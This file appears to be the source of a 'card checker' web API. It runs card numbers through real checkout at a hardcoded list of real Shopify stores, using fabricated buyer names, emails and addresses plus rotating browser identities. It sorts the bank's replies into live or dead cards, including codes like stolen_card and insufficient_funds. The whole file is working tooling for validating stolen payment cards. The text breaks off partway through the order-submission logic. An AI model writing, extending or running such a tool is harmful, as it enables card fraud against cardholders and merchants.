"""
Shopify Card Checker API - Hosted on Railway
Receives card data + site, does Shopify checkout, returns bank result.
"""
import os
import asyncio
import json
import random
import string
import time
import uuid
import hashlib
import re
import logging
from urllib.parse import urlparse, parse_qs, unquote

import aiohttp
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger("shopify_api")

app = FastAPI(title="Shopify Card Checker API")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
]

SHOPIFY_SITES = [
    "www.rarebeauty.com", "www.olehenriksen.com", "www.fentybeauty.com",
    "shopmissa.com", "dayspring-pens.myshopify.com", "brokeallday.myshopify.com",
    "boatcarpetbuys.myshopify.com", "aloracosmetics.myshopify.com", "www.wetnwildbeauty.com",
    "www.anastasiabeverlyhills.com", "bulletmole1.myshopify.com", "www.puravidabracelets.com",
    "www.glowrecipe.com", "biggerfive.myshopify.com", "www.revlon.com",
    "cubitt-official.myshopify.com", "better-boat.myshopify.com",
    "desert-does-it.myshopify.com", "dose-of-colors.myshopify.com", "www.brooklinen.com",
    "coyotevest.myshopify.com", "1x2r9x-2w.myshopify.com", "www.deadstock.ca",
    "www.skims.com", "www.loveyourmelon.com", "bosideng-fashion.myshopify.com",
    "www.stevemadden.com", "www.hauslabs.com", "www.teeinblue.com",
    "www.kyliecosmetics.com", "www.maccosmetics.com", "camprageous.myshopify.com",
    "couch-collectibles.myshopify.com", "biaggi-1.myshopify.com", "canisathlete.myshopify.com",
    "www.jennikayne.com", "www.kosas.com", "www.tarte.com", "www.morphe.com",
    "www.glossier.com", "brendagrands.myshopify.com", "cove-home-8002.myshopify.com",
    "colourpop.com", "www.summerfridays.com", "www.everlane.com",
    "conner-hats.myshopify.com", "negativeunderwear.com", "helmboots.com",
    "www.outdoorvoices.com", "carbon-38.myshopify.com", "www.kizik.com",
    "www.mejuri.com", "www.danielwellington.com", "bychari.myshopify.com",
    "dapper-lighting.myshopify.com",
]

FAKE_GATEWAYS = {"bogus", "test", "fake", "debug", "manual"}

LIVE_DECLINE_CODES = {
    "insufficient_funds", "do_not_honor", "generic_decline",
    "lost_card", "stolen_card", "pickup_card", "restricted_card",
    "not_permitted", "security_violation", "incorrect_cvc", "incorrect_zip",
    "card_velocity_exceeded", "transaction_not_allowed", "try_again_later",
    "fraudulent", "issuer_not_available", "processing_error",
}

ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234'},
    {'street': '1234 Market St', 'city': 'Philadelphia', 'state': 'PA', 'zip': '19107', 'phone': '2155551234'},
    {'street': '500 Boylston St', 'city': 'Boston', 'state': 'MA', 'zip': '02116', 'phone': '6175551234'},
    {'street': '700 Pike St', 'city': 'Seattle', 'state': 'WA', 'zip': '98101', 'phone': '2065551234'},
    {'street': '225 Bush St', 'city': 'San Francisco', 'state': 'CA', 'zip': '94104', 'phone': '4155551234'},
    {'street': '4040 Spencer St', 'city': 'Las Vegas', 'state': 'NV', 'zip': '89119', 'phone': '7025551234'},
]

PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},queueToken:$queueToken}){__typename result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}...on PendingTerms{__typename}}delivery{__typename ...on PendingTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name}}}}}}}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage}}}}'

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id orderIdentity{id}}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'


class CheckRequest(BaseModel):
    cc: str
    mm: str
    yy: str
    cvv: str
    site: str = None
    sites: list = None
    proxy: str = None


class CheckResponse(BaseModel):
    status: str
    response: str
    gateway: str
    amount: str = None
    site: str = None
    elapsed: float
    verdict: str = None


def _get_ua():
    return random.choice(USER_AGENTS)

def _extract_between(text, start, end):
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return None

def _generate_script_fingerprint():
    sig_uuid = str(uuid.uuid4())
    seed = f"{sig_uuid}{time.time()}{random.random()}"
    signature = hashlib.sha256(seed.encode()).hexdigest()[:40]
    return {'signature': signature, 'signatureUuid': sig_uuid, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []}

def _checkout_graphql_headers(domain, checkout_url):
    source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
    return {
        'User-Agent': _get_ua(), 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json', 'Origin': f'https://{domain}', 'Referer': checkout_url,
        'x-checkout-web-source-id': source_id,
    }

def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    return f"{name}{num}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"

def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
    return random.choice(firsts), random.choice(lasts)

def _random_address():
    return random.choice(ADDRESSES)

def _is_fake_gateway(gw):
    return any(f in (gw or "").lower() for f in FAKE_GATEWAYS)

def _parse_bank_response(text):
    resp = {'response_code': '', 'transaction_id': ''}
    try:
        data = json.loads(text)
        receipt = data.get('data', {}).get('receipt', {})
        pe = receipt.get('processingError', {})
        resp['response_code'] = pe.get('code', '')
        resp['transaction_id'] = receipt.get('id', '')
    except Exception:
        pass
    return resp

def _parse_products(data):
    products = data.get('products', [])
    if not products:
        return None
    min_price = float('inf')
    best = None
    for product in products:
        for variant in product.get('variants', []):
            if not variant.get('available', False):
                continue
            try:
                price = float(str(variant.get('price', '0')).replace(',', ''))
                if 0 < price < min_price:
                    min_price = price
                    best = {'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'handle': product['handle']}
            except Exception:
                continue
    if not best:
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available', False):
                    try:
                        price = float(str(variant.get('price', '0')).replace(',', ''))
                        best = {'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'handle': product['handle']}
                    except Exception:
                        continue
    return best

def _extract_session_token(text):
    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
    if not sst:
        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
    return sst

def _parse_seller(seller):
    if not seller or not isinstance(seller, dict):
        return '0', 'USD', '0', None, '', '0', None, None, None
    rt = seller.get('runningTotal', {})
    running_total = rt.get('value', {}).get('amount', '0') if isinstance(rt, dict) else '0'
    currency = rt.get('value', {}).get('currencyCode', 'USD') if isinstance(rt, dict) else 'USD'
    tax_data = seller.get('tax', {})
    tax_amount = '0'
    if isinstance(tax_data, dict) and 'totalTaxAmount' in tax_data:
        tax_amount = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
    delivery_data = seller.get('delivery', {})
    delivery_strategy = ''
    shipping_amount = '0'
    if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
        lines = delivery_data.get('deliveryLines', [])
        strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
        if strategies:
            delivery_strategy = strategies[0].get('handle', '')
            shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
    pm_id = None
    gw_name = None
    flex_terms_id = None
    payment_data = seller.get('payment', {})
    if isinstance(payment_data, dict) and payment_data.get('__typename') == 'FilledPaymentTerms':
        payment_lines = payment_data.get('availablePaymentLines', [])
        if payment_lines:
            pm = payment_lines[0].get('paymentMethod', {})
            pm_id = pm.get('paymentMethodIdentifier')
            gw_name = pm.get('name')
        # Extract paymentFlexibilityTermsId
        flex = payment_data.get('availablePaymentLines', [])
        if flex:
            flex_data = flex[0].get('paymentFlexibilityTerms', {})
            if isinstance(flex_data, dict):
                flex_terms_id = flex_data.get('paymentFlexibilityTermsId')
    del_type = delivery_data.get('__typename') if isinstance(delivery_data, dict) else None
    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, pm_id, gw_name, flex_terms_id


async def _negotiate(session, graphql_url, headers, variables):
    for attempt in range(3):
        try:
            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=8))
            data = await resp.json(content_type=None)
            negotiate = data.get('data', {}).get('session', {}).get('negotiate', {})
            if not negotiate or not isinstance(negotiate, dict):
                continue
            result = negotiate.get('result', {})
            if not result or not isinstance(result, dict):
                result = negotiate
            return result
        except Exception:
            if attempt < 2:
                await asyncio.sleep(0.3)
                continue
            return {'__typename': 'NegotiationResultFailed'}


async def _shopify_check(session, domain, cc, mm, yy, cvv):
    domain = domain.replace('https://', '').replace('http://', '').strip('/')
    base_url = f"https://{domain}"
    gw_name = 'Shopify Payments'
    UA = _get_ua()

    headers = {'User-Agent': UA, 'Accept': 'application/json', 'Content-Type': 'application/json'}
    
    # Find product
    product = None
    for endpoint in [f"{base_url}/collections/all/products.json?limit=10", f"{base_url}/products.json?limit=10"]:
        try:
            async with session.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json'}, timeout=aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=8)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    product = _parse_products(data)
                    if product:
                        break
                else:
                    logger.info(f"Product fetch {domain} HTTP {resp.status}")
        except Exception as e:
            logger.info(f"Product fetch {domain} error: {str(e)[:80]}")
            continue
    if not product:
        return None, "No products available", gw_name, {'verdict': 'UNTESTED'}

    variant_id = product['variant_id']
    subtotal_price = product['price']
    first, last = _random_name()
    email = _random_email()
    addr = _random_address()
    street, city, state, s_zip, phone = addr['street'], addr['city'], addr['state'], addr['zip'], addr['phone']

    # Add to cart
    try:
        async with session.post(f"{base_url}/cart/add.js", json={'id': int(variant_id)}, headers=headers, timeout=aiohttp.ClientTimeout(total=6)) as resp:
            if resp.status != 200:
                return None, "Failed to add to cart", gw_name, {'verdict': 'UNTESTED'}
    except Exception:
        return None, "Failed to add to cart", gw_name, {'verdict': 'UNTESTED'}

    # Create checkout
    ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'Accept-Language': 'en-US,en;q=0.9'}
    try:
        async with session.post(f"{base_url}/checkout/", headers=ch_headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            checkout_url = str(resp.url)
            text = await resp.text()
    except Exception:
        return None, "Failed to create checkout", gw_name, {'verdict': 'UNTESTED'}

    if 'login' in checkout_url.lower() or 'password' in checkout_url.lower():
        return None, "Site requires login", gw_name, {'verdict': 'UNTESTED'}

    sst = _extract_session_token(text)
    if not sst:
        return None, "No session token", gw_name, {'verdict': 'UNTESTED'}

    queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
    stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')
    currency = 'USD'
    pm_match = re.search(r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?', text.lower())
    if pm_match:
        currency = pm_match.group(1).upper()
    payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    logger.info(f"SST={sst[:15]}... qt={bool(queue_token)} sid={bool(stable_id)} pmi={payment_method_id} cur={currency}")

    graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
    gql_headers = _checkout_graphql_headers(domain, checkout_url)

    addr_block = {'address1': street, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': s_zip, 'firstName': first, 'lastName': last, 'zoneCode': state, 'phone': phone, 'company': ''}

    merch_block = {
        'stableId': stable_id,
        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'value': {'amount': subtotal_price, 'currencyCode': currency}},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    common_vars = {
        'sessionInput': {'sessionToken': sst}, 'queueToken': queue_token,
        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
        'merchandise': {'merchandiseLines': [merch_block]},
        'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': 'US'}, 'rememberMe': False},
        'tip': {'tipLines': []},
        'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
        'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []},
        'nonNegotiableTerms': None,
        'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False},
    }

    latest_qt = [queue_token]
    def _make_vars():
        v = {**common_vars}; v['queueToken'] = latest_qt[0]; return v
    def _update_qt(result):
        if not result or not isinstance(result, dict): return
        qt = result.get('queueToken')
        if qt: latest_qt[0] = qt

    # Negotiate shipping
    try:
        step1_vars = _make_vars()
        step1_vars['delivery'] = {'deliveryLines': [{'destination': {'partialStreetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
        step1_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': 'US', 'lastName': '', 'zoneCode': '', 'phone': ''}}}
        
        r = await _negotiate(session, graphql_url, gql_headers, step1_vars)
        _update_qt(r)
        await asyncio.sleep(0.1)
        step1_vars['queueToken'] = latest_qt[0]
        result1 = await _negotiate(session, graphql_url, gql_headers, step1_vars)
        _update_qt(result1)
        logger.info(f"Negotiate1: typename={result1.get('__typename') if result1 else 'None'} qt={bool(latest_qt[0])}")

        if not result1 or not isinstance(result1, dict):
            return None, "Negotiate error: no response", gw_name, {'verdict': 'UNTESTED'}
        tn = result1.get('__typename', '')
        if tn == 'CheckpointDenied': return None, "Checkpoint Denied", gw_name, {'verdict': 'UNTESTED'}
        if tn == 'NegotiationResultFailed': return None, "Negotiation failed", gw_name, {'verdict': 'UNTESTED'}
        if tn != 'NegotiationResultAvailable': return None, f"Negotiation failed: {tn}", gw_name, {'verdict': 'UNTESTED'}

        sp1 = result1.get('sellerProposal')
        if not sp1 or not isinstance(sp1, dict): return None, "No seller proposal", gw_name, {'verdict': 'UNTESTED'}
        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw, flex_terms_id = _parse_seller(sp1)
        if api_pmi and not payment_method_id: payment_method_id = api_pmi
        gw_name = api_gw or 'Shopify Payments'

        if not delivery_strategy: return None, "No shipping available", gw_name, {'verdict': 'UNTESTED'}

        def _build_delivery():
            return {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}

        step2_vars = _make_vars()
        step2_vars['delivery'] = _build_delivery()
        step2_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
        result2 = await _negotiate(session, graphql_url, gql_headers, step2_vars)
        _update_qt(result2)
        if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
            sp2 = result2.get('sellerProposal')
            if sp2 and isinstance(sp2, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi2, api_gw2, flex_terms_id2 = _parse_seller(sp2)
                if api_pmi2 and not payment_method_id: payment_method_id = api_pmi2
                if api_gw2: gw_name = api_gw2
                if flex_terms_id2: flex_terms_id = flex_terms_id2
    except Exception as e:
        return None, f"Negotiate error: {str(e)[:50]}", gw_name, {'verdict': 'UNTESTED'}

    # Tokenize card via Shopify PCI vault
    year_full = f"20{yy}" if len(yy) == 2 else yy
    
    # Use raw card number (no spaces) and integer month/year for PCI endpoint
    token_payload = {
        "credit_card": {
            "number": cc,
            "month": int(mm),
            "year": int(year_full),
            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": f"{first} {last}"
        },
        "payment_session_scope": domain
    }

    pci_build_hash = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
    pci_build = pci_build_hash.group(1) if pci_build_hash else 'a8e4a94'
    
    vault_headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://checkout.pci.shopifyinc.com',
        'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build}/number-ltr.html?identifier=&locationURL={checkout_url}',
        'User-Agent': UA,
        'sec-ch-ua': '"Google Chrome";v="138", "Chromium";v="138", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
    }

    try:
        async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            vault_data = await resp.json(content_type=None)
            if 'id' not in vault_data:
                err_msg = vault_data.get('error', '') or str(vault_data)[:100]
                logger.info(f"Vault rejected: {err_msg}")
                return None, f"Invalid card - vault rejected ({err_msg[:50]})", gw_name, {'verdict': 'UNTESTED'}
            payment_token = vault_data['id']
            logger.info(f"Vault OK: token={payment_token[:20]}...")
    except Exception as e:
        logger.info(f"Vault failed: {str(e)[:80]}")
        # Fallback to deposit.shopifycs.com
        try:
            fallback_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": cc, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}
            async with session.post('https://deposit.shopifycs.com/sessions', json=fallback_payload, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                vault_data = await resp.json(content_type=None)
                if 'id' in vault_data:
                    payment_token = vault_data['id']
                    logger.info(f"Vault fallback OK: token={payment_token[:20]}...")
                else:
                    return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}
        except Exception:
            return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}

    # Submit payment
    try:
        payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
        step3_vars = _make_vars()
        step3_vars['delivery'] = _build_delivery()
        step3_vars['payment'] = payment_input
        result3 = await _negotiate(session, graphql_url, gql_headers, step3_vars)
        _update_qt(result3)
        logger.info(f"Step3 result: typename={result3.get('__typename') if result3 else 'None'}")
        if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
            sp3 = result3.get('sellerProposal')
            if sp3 and isinstance(sp3, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi3, api_gw3, flex_terms_id3 = _parse_seller(sp3)
                logger.info(f"Step3 PMI: old={payment_method_id} new={api_pmi3}")
                # Use the payment method ID from the negotiate response (most up-to-date)
                if api_pmi3:
                    payment_method_id = api_pmi3
                    payment_input['paymentLines'][0]['paymentMethod']['directPaymentMethod']['paymentMethodIdentifier'] = payment_method_id
                if api_gw3: gw_name = api_gw3
                payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
                if flex_terms_id3: flex_terms_id = flex_terms_id3
    except Exception as e:
        logger.info(f"Step3 error: {str(e)[:80]}")

    # Add paymentFlexibilityTermsId to payment input if we have it
    if flex_terms_id:
        payment_input['paymentLines'][0]['paymentFlexibilityTerms'] = {'paymentFlexibilityTermsId': flex_terms_id}
        logger.info(f"Added paymentFlexibilityTermsId: {flex_terms_id}")

    # Submit order — re-vault card right before submit to prevent token expiry
    submit_delivery = {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': True, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
    submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
    checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
    attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]
    
    logger.info(f"Checkout URL: {checkout_url[:100]}")
    logger.info(f"Attempt token: {attempt_token}")
    logger.info(f"GraphQL URL: {graphql_url}")

    # Re-vault the card to get a fresh token (prevents PAYMENTS_CREDIT_CARD_BASE_EXPIRED)
    try:
        async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            vault_data = await resp.json(content_type=None)
            if 'id' in vault_data:
                payment_token = vault_data['id']
                logger.info(f"Re-vaulted card: fresh token obtained")
    except Exception:
        pass  # Use the old token as fallback

    payment_input['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = payment_token

    completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}

    async def _do_submit():
        try:
            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=8))
            return await r.text()
        except Exception:
            return '{"error":"submit_timeout"}'

    text = await _do_submit()
    logger.info(f"Submit response: {text[:500]}")
    logger.info(f"Payment method ID: {payment_method_id}")
    logger.info(f"Payment token: {payment_token[:20] if payment_token else 'None'}...")
    logger.info(f"Running total: {running_total} {currency}")

    if "Your order total has changed." in text:
        text = await _do_submit()
    if "The requested payment method is not available." in text:
        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'PAYMENTS_METHOD', 'iso': '', 'meaning': 'Payment method unavailable. Bank never responded.'}

    receipt_id = None
    try:
        resp_json = json.loads(text)
        submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
        typename = submit_data.get('__typename', '')

        if typename == 'SubmitRejected':
            errors = submit_data.get('errors', [])
            codes = [e.get('code', '') for e in errors]
            all_codes = ', '.join(codes[:2]) if codes else 'UNKNOWN'

            # If card token expired, re-vault and retry once
            if 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED' in codes:
                logger.info(f"Token expired, re-vaulting and retrying...")
                try:
                    async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        vault_data = await resp.json(content_type=None)
                        if 'id' in vault_data:
                            payment_token = vault_data['id']
                            payment_input['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = payment_token
                            completion_vars['input']['payment'] = payment_input
                            text = await _do_submit()
                            logger.info(f"Re-submit after re-vault: {text[:300]}")
                            resp_json = json.loads(text)
                            submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                            typename = submit_data.get('__typename', '')
                            if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                                receipt_id = submit_data.get('receipt', {}).get('id')
                                # Skip the SubmitRejected handling below
                                codes = []
                except Exception as e:
                    logger.info(f"Re-vault retry failed: {str(e)[:80]}")

            if codes and typename == 'SubmitRejected':
                # If terms need to be accepted, retry with nonNegotiableTerms containing signature+contents
                if any('TERM' in c.upper() or 'WAITING' in c.upper() for c in codes):
                    logger.info(f"Terms required, retrying with terms data...")
                    completion_vars['input']['nonNegotiableTerms'] = {'signature': str(uuid.uuid4()), 'contents': []}
                    text = await _do_submit()
                    logger.info(f"Re-submit after terms: {text[:300]}")
                    try:
                        resp_json = json.loads(text)
                        submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                        typename = submit_data.get('__typename', '')
                        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                            receipt_id = submit_data.get('receipt', {}).get('id')
                            codes = []  # Skip reject handling
                    except Exception:
                        pass

